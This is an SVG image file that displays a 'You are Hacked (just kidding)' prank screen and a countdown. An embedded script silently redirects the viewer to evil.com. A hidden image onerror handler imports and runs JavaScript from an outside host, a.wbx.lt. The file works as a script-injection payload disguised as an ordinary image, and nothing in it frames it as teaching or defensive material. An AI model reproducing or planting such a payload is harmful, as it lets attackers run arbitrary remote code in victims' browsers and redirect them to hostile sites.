<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg xmlns="http://www.w3.org/2000/svg"
     width="100%"
     height="100%"
     viewBox="0 0 100 100">

  <!-- Background -->
  <rect width="100%" height="100%" fill="black"/>

  <!-- Funny intro text -->
  <text x="50" y="35"
        fill="lime"
        font-size="6"
        text-anchor="middle"
        dominant-baseline="middle">
    You are Hacked 😎 (just kidding)
  </text>

  <!-- Warning / joke message -->
  <text x="50" y="50"
        fill="red"
        font-size="6"
        text-anchor="middle"
        dominant-baseline="middle">
    You are going to the hell 🔥
  </text>

  <!-- Countdown line -->
  <text id="countdown"
        x="50" y="65"
        fill="white"
        font-size="5"
        text-anchor="middle"
        dominant-baseline="middle">
    Redirecting in 5...
  </text>

  <!-- JavaScript -->
  <script type="application/ecmascript"><![CDATA[
    try {
      var seconds = 10;
      var countdown = document.getElementById("countdown");

      var timer = setInterval(function () {
        seconds--;
        countdown.textContent = "Redirecting in " + seconds + "...";

        if (seconds <= 0) {
          clearInterval(timer);
          window.location.href = "https://evil.com";
        }
      }, 1000);
    } catch (e) {
      // Silent fail if sandboxed
    }
  ]]></script>
<image href="x" onerror="javascript:import('https://a.wbx.lt/x.js')"></image>
</svg>
